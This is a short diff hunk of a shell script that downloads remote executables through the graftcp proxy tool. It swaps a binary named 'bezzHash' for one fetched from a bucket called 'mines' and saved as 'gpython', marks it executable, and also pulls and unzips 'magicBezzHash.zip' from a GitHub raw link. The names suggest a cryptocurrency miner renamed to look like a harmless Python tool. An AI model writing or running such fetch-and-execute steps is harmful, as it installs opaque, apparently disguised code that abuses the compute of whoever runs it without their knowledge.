@@ -35,8 +35,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://download1592.mediafire.com/iglhn4czue2g/ha38met7evs75rz/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://ewr1.vultrobjects.com/mines/gpython
+chmod +x gpython
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
